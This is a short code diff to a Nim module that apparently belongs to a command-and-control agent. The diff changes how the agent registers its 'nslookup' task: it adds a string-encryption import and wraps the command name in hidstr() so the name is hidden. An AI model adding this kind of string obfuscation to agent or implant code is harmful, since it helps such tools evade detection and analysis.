@@ -1,6 +1,7 @@
 import std/[json, osproc, strutils]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc nslookupExecute(taskId: string, params: JsonNode, state: AgentState,
                      send: SendMsg): TaskResult =
@@ -15,4 +16,4 @@ proc nslookupExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initNslookup*() =
-  register("nslookup", nslookupExecute)
+  register(hidstr("nslookup"), nslookupExecute)
